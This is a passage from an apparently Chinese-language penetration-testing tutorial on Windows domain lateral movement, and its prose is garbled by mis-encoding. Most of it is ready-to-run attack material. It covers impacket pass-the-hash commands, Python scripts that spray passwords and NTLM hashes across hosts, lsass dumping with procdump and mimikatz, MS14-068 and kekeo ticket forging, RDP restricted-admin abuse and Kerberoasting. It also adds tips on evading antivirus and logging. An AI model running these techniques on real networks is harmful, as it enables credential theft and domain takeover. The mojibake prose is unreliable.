æ˜æ–‡å’ŒHASH ä¼ é€’æ”»å‡»</strong></h2><p><strong>impacketçš„exeç‰ˆæœ¬:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>ä¼˜ç‚¹:å‘½ä»¤ç®€å•ï¼Œæ˜“ä¸Šæ‰‹</strong></p><p><strong>ç¼ºç‚¹:éå®˜æ–¹è‡ªå¸¦ï¼Œå¯èƒ½è¢«æ€</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>æ˜æ–‡ HASH ä¼ é€’æ‰¹é‡åˆ©ç”¨</strong></p><p>æ”¶é›†æ´»è·ƒipï¼Œæ”¾åœ¨ip.txtä¸­</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #æ‰¹é‡æ£€æµ‹ IP å¯¹åº”æ˜æ–‡è¿æ¥FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #æ‰¹é‡æ£€æµ‹ IP å¯¹åº”æ˜æ–‡å›æ˜¾ç‰ˆ</code></pre><p>æ”¶é›†å¯èƒ½çš„å¯†ç å’Œhashæ”¾åœ¨æ–‡ä»¶ä¸­</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #æ‰¹é‡æ£€æµ‹æ˜æ–‡å¯¹åº” IPå›æ˜¾ç‰ˆFOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #æ‰¹é‡æ£€æµ‹ HASH å¯¹åº” IP å›æ˜¾ç‰ˆ</code></pre><p><strong>æ˜æ–‡HASHä¼ é€’æ‰¹é‡åˆ©ç”¨-å‡çº§ç‰ˆ</strong></p><p>åˆ©ç”¨pyè„šæœ¬åˆ¶ä½œçš„exeæ–‡ä»¶æ‰¹é‡å°è¯•æ¨ªå‘æ¸—é€</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    &#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>æ‰§è¡Œæ•ˆæœ</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>å°†pythonè„šæœ¬ç¼–è¯‘æˆexeæ–‡ä»¶</p><p>å®‰è£…pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>ç”Ÿæˆå¯æ‰§è¡ŒEXE</p><pre><code>Pyinstaller -F [.pyæ–‡ä»¶]</code></pre><p>ä¼šç”Ÿæˆä¸€ä¸ªåŒåçš„exeæ–‡ä»¶ </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-é…åˆè·å–hashå¯†ç "><a href="#Procdump-Mimikatz-é…åˆè·å–hashå¯†ç " class="headerlink" title="Procdump+Mimikatz é…åˆè·å–hashå¯†ç "></a><strong>Procdump+Mimikatz é…åˆè·å–hashå¯†ç </strong></h2><p>è¿™ç§æƒ…å†µé€‚ç”¨äºmimikatzè¢«æ€ï¼Œä½†æ˜¯è‡ªå·±åšå…æ€å¤±è´¥/æˆ–ä¸æƒ³åšå…æ€å¯ä»¥æ¥ä¸Procdumpé…åˆä½¿ç”¨ï¼Œå› ä¸ºProcdumpæ˜¯å®˜æ–¹è‡ªå¸¦çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ€</p><ul><li>Procdumpä¸‹è½½ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatzä¸‹è½½ï¼š<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œprocdump -accepteula -ma lsass.exe lsass.dmp# mimikatz åœ¨æœ¬åœ°æ‰§è¡Œï¼šprivilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>ç„¶åå¯ä»¥åˆ©ç”¨ Hashcat ç ´è§£è·å– Windows NTML Hash</p><h2 id="SMB-æœåŠ¡åˆ©ç”¨-psexec-å®˜æ–¹è‡ªå¸¦-ç¬¬ä¸‰æ–¹-smbexec-åªæœ‰ç¬¬ä¸‰æ–¹"><a href="#SMB-æœåŠ¡åˆ©ç”¨-psexec-å®˜æ–¹è‡ªå¸¦-ç¬¬ä¸‰æ–¹-smbexec-åªæœ‰ç¬¬ä¸‰æ–¹" class="headerlink" title="SMB æœåŠ¡åˆ©ç”¨-psexec(å®˜æ–¹è‡ªå¸¦+ç¬¬ä¸‰æ–¹),smbexec(åªæœ‰ç¬¬ä¸‰æ–¹)"></a><strong>SMB æœåŠ¡åˆ©ç”¨-psexec(å®˜æ–¹è‡ªå¸¦+ç¬¬ä¸‰æ–¹),smbexec(åªæœ‰ç¬¬ä¸‰æ–¹)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>åˆ©ç”¨ SMB æœåŠ¡å¯ä»¥é€šè¿‡æ˜æ–‡æˆ– hash ä¼ é€’æ¥è¿œç¨‹æ‰§è¡Œï¼Œæ¡ä»¶ 445 æœåŠ¡ç«¯å£å¼€æ”¾ã€‚</p><pre><code>#psexec ç¬¬ä¸€ç§ï¼šå…ˆæœ‰ ipc é“¾æ¥ï¼Œpsexec éœ€è¦æ˜æ–‡æˆ– hash ä¼ é€’net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # éœ€è¦å…ˆæœ‰ ipc é“¾æ¥ -s ä»¥ System æƒé™è¿è¡Œexit #é€€å‡º</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec ç¬¬äºŒç§ï¼šä¸ç”¨å»ºç«‹ IPC ç›´æ¥æä¾›æ˜æ–‡è´¦æˆ·å¯†ç psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨hashä¼ é€’æ—¶</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 å®˜æ–¹ Pstools æ— æ³•é‡‡ç”¨ hash è¿æ¥#éå®˜æ–¹è‡ªå¸¦-å‚è€ƒ impacket å·¥å…·åŒ…ä½¿ç”¨ï¼Œæ“ä½œç®€å•ï¼Œå®¹æ˜“è¢«æ€</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>å°±ä¼šå‡ºç°é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºå®˜æ–¹ Pstools æ— æ³•é‡‡ç”¨ hash è¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ impacket å·¥å…·åŒ…</p><p>ç¼ºç‚¹:éå®˜æ–¹ï¼Œä¼šè¢«æ€æ¯’è½¯ä»¶æ€æ‰ï¼Œæ‰€ä»¥è¦åšå…æ€</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>æ— éœ€å…ˆ ipc é“¾æ¥ æ˜æ–‡æˆ– hash ä¼ é€’</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-æœåŠ¡åˆ©ç”¨-wmic-cscript-wmiexec"><a href="#WMI-æœåŠ¡åˆ©ç”¨-wmic-cscript-wmiexec" class="headerlink" title="WMI æœåŠ¡åˆ©ç”¨-wmic,cscript,wmiexec"></a><strong>WMI æœåŠ¡åˆ©ç”¨-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) æ˜¯é€šè¿‡ 135 ç«¯å£è¿›è¡Œåˆ©ç”¨ï¼Œæ”¯æŒç”¨æˆ·åæ˜æ–‡æˆ–è€… hash çš„æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•ä¸ä¼šåœ¨ç›®æ ‡æ—¥å¿—ç³»ç»Ÿç•™ä¸‹ç—•è¿¹ã€‚</p><p><strong>è‡ªå¸¦ WMIC æ˜æ–‡ä¼ é€’ æ— å›æ˜¾ æ‰€ä»¥å†™å…¥æ–‡ä»¶å¤¹åè¿˜è¦è‡ªå·±æƒ³åŠæ³•è¯»å–</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>è‡ªå¸¦ cscript æ˜æ–‡ä¼ é€’ æœ‰å›æ˜¾</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escriptä¸éœ€è¦ä¸‹è½½ï¼Œè‡ªå¸¦ã€‚ä½†æ˜¯éœ€è¦ç”¨åˆ°ç¬¬ä¸‰æ–¹ wmiexec.vbsï¼Œä½†æ˜¯wmiexec.vbså…æ€éå¸¸ç®€å•</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>å¥—ä»¶ impacket wmiexec æ˜æ–‡æˆ– hash ä¼ é€’ æœ‰å›æ˜¾ exe ç‰ˆæœ¬</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>ç¼ºç‚¹ï¼šå®¹æ˜“è¢«æ€</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>åŒç†å¯ä»¥å€Ÿç”¨ç¼–ç¨‹è§£æ”¾åŒæ‰‹</p><p><strong>hash æ‰¹é‡åˆ©ç”¨-python ç¼–è¯‘ exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTTå“ˆå¸Œç¥¨æ®ä¼ é€’"><a href="#PTH-amp-PTK-amp-PTTå“ˆå¸Œç¥¨æ®ä¼ é€’" class="headerlink" title="PTH&amp;PTK&amp;PTTå“ˆå¸Œç¥¨æ®ä¼ é€’"></a><strong>PTH&amp;PTK&amp;PTTå“ˆå¸Œç¥¨æ®ä¼ é€’</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos åè®®åœ¨åŸŸä¸­å…·ä½“å·¥ä½œæ–¹æ³•ï¼š </p><p>**1ã€å®¢æˆ·æœºå°†æ˜æ–‡å¯†ç è¿›è¡Œ NTLM å“ˆå¸Œ,ç„¶åå’Œæ—¶é—´æˆ³ä¸€èµ·åŠ å¯†(ä½¿ç”¨ krbtgt å¯†ç  hash ä½œä¸ºå¯†é’¥)ï¼Œå‘é€ç»™ kdcï¼ˆåŸŸæ§ï¼‰ï¼Œkdc å¯¹ç”¨æˆ·è¿›è¡Œæ£€ æµ‹ï¼ŒæˆåŠŸä¹‹ååˆ›å»º TGT(Ticket-Granting Ticket) **</p><p>**2ã€å°† TGT è¿›è¡ŒåŠ å¯†ç­¾åè¿”å›ç»™å®¢æˆ·æœºå™¨ï¼Œåªæœ‰åŸŸç”¨æˆ· krbtgt æ‰èƒ½è¯» å– kerberos ä¸­ TGT æ•°æ® **</p><p>**3ã€ ç„¶åå®¢æˆ·æœºå°† TGT å‘é€ç»™åŸŸæ§åˆ¶å™¨ KDC è¯·æ±‚ TGSï¼ˆç¥¨è¯æˆæƒæœ åŠ¡ï¼‰ç¥¨è¯ï¼Œå¹¶ä¸”å¯¹ TGT è¿›è¡Œæ£€æµ‹ **</p><p><strong>4ã€ æ£€æµ‹æˆåŠŸä¹‹åï¼Œå°†ç›®æ ‡æœåŠ¡è´¦æˆ·çš„ NTLM ä»¥åŠ TGT è¿›è¡ŒåŠ å¯†ï¼Œå°† åŠ å¯†åçš„ç»“æœè¿”å›ç»™å®¢æˆ·æœºã€‚</strong></p><pre><code>PTH(pass the hash) #åˆ©ç”¨ lm æˆ– ntlm çš„å€¼è¿›è¡Œçš„æ¸—é€æµ‹è¯• PTT(pass the ticket) #åˆ©ç”¨çš„ç¥¨æ®å‡­è¯ TGT è¿›è¡Œçš„æ¸—é€æµ‹è¯• PTK(pass the key) #åˆ©ç”¨çš„ ekeys aes256 è¿›è¡Œçš„æ¸—é€æµ‹è¯•</code></pre><p><strong>PTH</strong></p><p>PTH åœ¨å†…ç½‘æ¸—é€ä¸­æ˜¯ä¸€ç§å¾ˆç»å…¸çš„æ”»å‡»æ–¹å¼ï¼ŒåŸç†å°±æ˜¯æ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡ LM Hash å’Œ NTLM Hash è®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸ç”¨æä¾›æ˜æ–‡å¯†ç ã€‚å¦‚æœç¦ç”¨äº† ntlm è®¤è¯ï¼ŒPsExec æ— æ³•åˆ©ç”¨è·å¾—çš„ ntlm hash è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä½†æ˜¯ä½¿ç”¨ mimikatz è¿˜æ˜¯å¯ ä»¥æ”»å‡»æˆåŠŸã€‚å¯¹äº 8.1/2012r2ï¼Œå®‰è£…è¡¥ä¸ kb2871997 çš„ Win 7/2008r2/8/2012 ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ AES keys ä»£æ›¿ NT hash æ¥å®ç° ptk æ”»å‡»ã€‚</p><p> æ€»ç»“ï¼šKB2871997 è¡¥ä¸åçš„å½±å“</p><p>pthï¼šæ²¡æ‰“è¡¥ä¸ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥ï¼Œæ‰“äº†è¡¥ä¸åªèƒ½ administrator è¿æ¥ </p><p>ptkï¼šæ‰“äº†è¡¥ä¸æ‰èƒ½ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥ï¼Œé‡‡ç”¨ aes256 è¿æ¥</p><p>å‚è€ƒé“¾æ¥: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT æ”»å‡»çš„éƒ¨åˆ†å°±ä¸æ˜¯ç®€å•çš„ NTLM è®¤è¯äº†ï¼Œå®ƒæ˜¯åˆ©ç”¨ Kerberos åè®®è¿›è¡Œæ”»å‡»çš„ã€‚</p><p>ä¸‰ç§ å¸¸è§çš„æ”»å‡»æ–¹æ³•ï¼šMS14-068ï¼ŒGolden ticketï¼ŒSILVER ticketã€‚</p><p>MS14-068 åŸºäºæ¼æ´ï¼Œé€ æˆçš„å±å®³æ˜¯å…è®¸åŸŸå†…ä»»ä½•ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œå°†è‡ªå·±æå‡è‡³åŸŸç®¡æƒé™ï¼Œå¾®è½¯ç»™å‡ºçš„è¡¥ä¸æ˜¯ kb3011780ã€‚</p><p>Golden ticket(é»„é‡‘ç¥¨æ®)ï¼ŒSILVER ticket(ç™½é“¶ç¥¨æ®)ï¼Œå±äºæƒé™ç»´æŒæŠ€æœ¯ ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†è¿æ¥åˆæ³•çš„ç¥¨æ®æ³¨å…¥åˆ° å†…å­˜ä¸­å®ç°è¿æ¥ã€‚</p><p><strong>æ¡ˆä¾‹:</strong></p><p><strong>1.PTHä¼ é€’-mimikatz</strong></p><p>å¦‚æœç¦ç”¨äº† ntlm è®¤è¯ï¼ŒPsExec æ— æ³•åˆ©ç”¨è·å¾—çš„ ntlm hash è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä½†æ˜¯ä½¿ç”¨ mimikatz è¿˜æ˜¯å¯ ä»¥æ”»å‡»æˆåŠŸã€‚</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>å‡è®¾æˆ‘ä»¬æ‰¾åˆ°äº†åŸŸæ§çš„hashå¯†ç </p><pre><code># PTH ntlm ä¼ é€’# æœªæ‰“è¡¥ä¸ä¸‹çš„å·¥ä½œç»„åŠåŸŸè¿æ¥ï¼šsekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #è¿æ¥åŸŸç”¨æˆ·sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #è¿æ¥æœ¬åœ°ç”¨æˆ·sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>å°±ä¼šå¼¹å‡ºä¸€ä¸ªcmdçª—å£</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTKä¼ é€’-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>è¿™ä¸ªå¿…é¡»æ‰“äº†è¡¥ä¸æ‰èƒ½è¿æ¥ï¼Œä¸ç„¶è¿ä¸ä¸Šå»</p><pre><code>PTK aes256 ä¼ é€’æ‰“è¡¥ä¸åçš„å·¥ä½œç»„åŠåŸŸè¿æ¥ï¼šsekurlsa::ekeys #è·å– aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.åŸŸæ¨ªå‘ç§»åŠ¨ PTT ä¼ é€’-ms14068&amp;kekeo&amp;æœ¬åœ°</strong></p><p>ç¬¬ä¸€ç§åˆ©ç”¨æ¼æ´ï¼šèƒ½å®ç°æ™®é€šç”¨æˆ·ç›´æ¥è·å–åŸŸæ§ system æƒé™</p><p>æ­¤å¤„mimikatzæ— éœ€æå‡æƒé™ï¼Œå› ä¸ºä¸æ¶‰åŠé«˜æƒé™æ“ä½œï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·å°±å¯ä»¥</p><pre><code>#MS14-068 powershell æ‰§è¡Œ1.æŸ¥çœ‹å½“å‰ sid whoami/user2.mimikatz # kerberos::purge//æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ mimikatz # kerberos::list //æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯mimikatz # kerberos::ptc ç¥¨æ®æ–‡ä»¶ //å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­3.åˆ©ç”¨ ms14-068 ç”Ÿæˆ TGT æ•°æ®ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -s sid -d åŸŸæ§åˆ¶å™¨åœ°å€ -p åŸŸæˆå‘˜å¯†ç MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.ç¥¨æ®æ³¨å…¥å†…å­˜mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.æŸ¥çœ‹å‡­è¯åˆ—è¡¨ klist6.åˆ©ç”¨dir \\192.168.3.21\c$  #å¦‚æœipæ— æ³•è¯†åˆ«ï¼Œæ”¹æˆè®¡ç®—æœºåå­—</code></pre><p>ç¬¬äºŒç§åˆ©ç”¨å·¥å…· kekeo</p><pre><code>1.ç”Ÿæˆç¥¨æ®kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.å¯¼å…¥ç¥¨æ®kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.æŸ¥çœ‹å‡­è¯ klist4.åˆ©ç”¨ net use è½½å…¥dir \\192.168.3.21\c$</code></pre><p>ç¬¬ä¸‰ç§åˆ©ç”¨mimikatzå¯¼å‡ºæœ¬åœ°ç¥¨æ®(éœ€è¦ç®¡ç†æƒé™)</p><p>åŸŸæ§è¿æ¥å10hå†…æœ‰æ•ˆ</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>æ€»ç»“ï¼šptt ä¼ é€’ä¸éœ€æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿æ¥æ—¶ä¸»æœºåè¿æ¥ï¼ŒåŸºäºæ¼æ´,å·¥å…·,æœ¬åœ°ç¥¨æ®</strong></p><h2 id="RDPä¸SPN"><a href="#RDPä¸SPN" class="headerlink" title="RDPä¸SPN"></a><strong>RDPä¸SPN</strong></h2><p><strong>RDP</strong></p><p>RDPåè®®è¿æ¥ï¼šåˆ¤æ–­å¯¹æ–¹è¿œç¨‹æ¡Œé¢æœåŠ¡æ˜¯å¦å¼€å¯ï¼ˆé»˜è®¤ï¼š3389ï¼‰ï¼Œç«¯å£æ‰«æåˆ¤æ–­</p><pre><code>RDPæ˜æ–‡å¯†ç é“¾æ¥1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDPå¯†æ–‡HASHé“¾æ¥windows Serveréœ€è¦å¼€å¯ Restricted Admin modeï¼Œåœ¨Windows 8.1å’ŒWindows Server 2012 R2ä¸­é»˜è®¤å¼€å¯ï¼ŒåŒæ—¶å¦‚æœWin 7 å’ŒWindows Server 2008 R2å®‰è£…äº†2871997ã€2973351è¡¥ä¸ä¹Ÿæ”¯æŒï¼›å¼€å¯å‘½ä»¤ï¼šREG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /få¼€å¯åè¿è¡Œï¼š1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>åŸŸæ¨ªå‘ç§»åŠ¨SPNæœåŠ¡-æ¢é’ˆ,è¯·æ±‚,å¯¼å‡º,ç ´è§£,é‡å†™</strong></p><p>é»‘å®¢å¯ä»¥ä½¿ç”¨æœ‰æ•ˆçš„åŸŸç”¨æˆ·çš„èº«ä»½éªŒè¯ç¥¨è¯ï¼ˆTGTï¼‰å»è¯·æ±‚è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªæˆ–å¤šä¸ªç›®æ ‡æœåŠ¡çš„æœåŠ¡ç¥¨è¯ã€‚DCåœ¨æ´»åŠ¨ç›®å½•ä¸­æŸ¥æ‰¾SPNï¼Œå¹¶ä½¿ç”¨ä¸SPNå…³è”çš„æœåŠ¡å¸æˆ·åŠ å¯†ç¥¨è¯ï¼Œä»¥ä¾¿æœåŠ¡èƒ½å¤ŸéªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®ã€‚è¯·æ±‚çš„KerberosæœåŠ¡ç¥¨è¯çš„åŠ å¯†ç±»å‹æ˜¯RC4_HMAC_MD5ï¼Œè¿™æ„å‘³ç€æœåŠ¡å¸æˆ·çš„NTLMå¯†ç å“ˆå¸Œç”¨äºåŠ å¯†æœåŠ¡ç¥¨è¯ã€‚é»‘å®¢å°†æ”¶åˆ°çš„TGSç¥¨æ®ç¦»çº¿è¿›è¡Œç ´è§£ï¼Œå³å¯å¾—åˆ°ç›®æ ‡æœåŠ¡å¸å·çš„HASHï¼Œè¿™ä¸ªç§°ä¹‹ä¸ºKerberoastæ”»å‡»ã€‚å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸ºåŸŸç”¨æˆ·å¸æˆ·æ³¨å†Œçš„ä»»æ„SPNï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¸æˆ·çš„æ˜æ–‡å¯†ç çš„NTLMå“ˆå¸Œå€¼å°±å°†ç”¨äºåˆ›å»ºæœåŠ¡ç¥¨è¯ã€‚è¿™å°±æ˜¯Kerberoastingæ”»å‡»çš„å…³é”®ã€‚</p><p>1ã€æ¢é’ˆ</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2ã€è¯·æ±‚ç¥¨æ®</p><pre><code>klist purge //åˆ é™¤ç¼“å­˜ç¥¨æ®klist    //æŸ¥çœ‹ç¥¨æ®# è¯·æ±‚ç¥¨æ® # powershellè¯·æ±‚Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# æˆ–è€…mimikatzè¯·æ±‚mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3ã€å¯¼å‡ºç¥¨æ®(åˆ°mimikatzè¿è¡Œç›®å½•)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4ã€ç ´è§£ç¥¨æ®</p><pre><code># ç ´è§£å·¥å…·tgsrepcrack.py 